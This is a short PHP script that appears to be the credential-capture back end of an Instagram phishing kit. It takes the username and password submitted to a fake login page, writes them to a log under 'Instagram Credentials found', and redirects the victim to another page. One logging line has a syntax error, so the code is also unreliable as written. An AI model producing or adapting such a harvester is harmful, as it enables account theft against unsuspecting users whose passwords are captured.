<?php
include 'ip.php';
error_log("-----------------------------------------------------------------------");
error_log("Instagram Credentials found");
error_log("[EMAIL]: " . $_POST['username'] ."\n" " [PASS]: " . $_POST['password'] . ");
error_log("-----------------------------------------------------------------------");
header('Location:/index2.html');
exit();

